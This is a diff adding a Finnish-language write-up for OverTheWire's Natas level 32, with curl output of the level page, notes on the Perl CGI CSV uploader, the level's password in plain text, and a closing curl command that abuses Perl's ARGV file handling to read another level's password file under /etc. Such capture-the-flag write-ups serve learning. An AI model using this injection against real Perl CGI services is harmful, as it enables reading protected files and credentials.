@@ -457,12 +457,201 @@ https://lioxliu.wordpress.com/2020/12/27/overthewire-natas-level-31/
 natas32 : NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
 
 
+Alkuun natas 32 mukaan näyttää normaalilta, et vähä kuin natas 31 tason mukaan - voi olla vähä vaikeampi tasoinen. Upotin saman aikaisemman excel .csv taulukon et luki sisäisen taulukkon jutunsa lävitse ja toisti mitä siellä excel taulukkossa lukeekaan.
+
+![alt text](./kuvat-level29-34/natas32-0.png)
 
 
 
+![alt text](./kuvat-level29-34/natas32-1.png)
+
+
+Tarkistettuna view source html voi olla pikkasen uutta/muokattua/parannettua versiota - voiko olla sama tiedoston injektio tyyppinen taso?
+
+![alt text](./kuvat-level29-34/natas32-2.png)
+
+
+## pieni teoria
+
+Koskien view-source html:ää, mitä tässä koodissa lukekaan.
+
+Kyseessä on Perl CGI-skripti, joka tarjoaa yksinkertaisen web-sivun, jossa voi ladata CSV-tiedoston, ja sitten se muuntaa CSV:n HTML-taulukoksi. Taulukko on myös lajiteltava (`sortable`) ja tyylitelty Bootstrapilla.
+
+
+Pientä yksityiskohtaa:
+- Skripti asettaa ympäristömuuttujan `$ENV{'TMPDIR'}` väliaikaistiedostojen hakemistoksi (tähän `/var/www/natas/natas32/tmp/`).
+- CGI moduulia käytetään lomaketietojen käsittelyyn.
+-tämä eroaa natas 31 aikaisemman tason, koska siellä saattoi lukea tiedostoa suoraan tai suorittaa komentoja suoraan GET-parametrillä.
+- Tässä natas32:ssa pitää käyttää palvelimen binääriä, koska salasana on suojattu tiedoston oikeuksilla eli toisin sanoen on vähä parannettu "privilege escalation" tyyppinen taso. Kertauksena **natas31** oli tiedostojen upottamisen injektio keino, mutta nyt on kyseessä parannettu versio ja oikeuden taso.
+
+
+## Kali linux 
+
+Kali linux tarkistusta
+
+Muutama ja pientä curl komentojen tarkistusta:
 
 
 
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://natas32.natas.labs.overthewire.org/ --user natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
+    <br><br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>    
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form> 
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -Headers "Referer: http://natas33.natas.labs.overthewire.org/" http://natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B@natas32.natas.labs.overthewire.org
+curl: (3) URL rejected: Malformed input to a URL function
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
+    <br><br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>    
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form> 
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+---
+
+Tämä on se aikaisempi komento natas31:stä, mutta pientä muutosta ja ohjeiden mukaan haettu ja testataan. tässä tapahtui siis curl mikä käyttis (`-u`) username:password, sitten nettisivuston url ja polku /etc/ josta haettaan seuraava natas33:sen salasanansa. File ARGV joka on se suorittaa ohjauksensa *PERL CGI:tä* käyttämällä komentoriviparametriä tähän tiedostoa ja haluamme kokeilla uudestaan tätä olemassa olevaa excel tauluko tiedoston upottamisen injektiota.
+
+- URL-osoitteessa viitataan /etc/-hakemistoon ja yritetään hakea seuraavan tason (natas33) salasanaa.
+- Tiedostonimessä käytetään ARGV, joka ohjaa Perl CGI -skriptiä käyttämään sitä komentoriviparametrina.
+
+```
+curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas33" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
+```
 
 
 
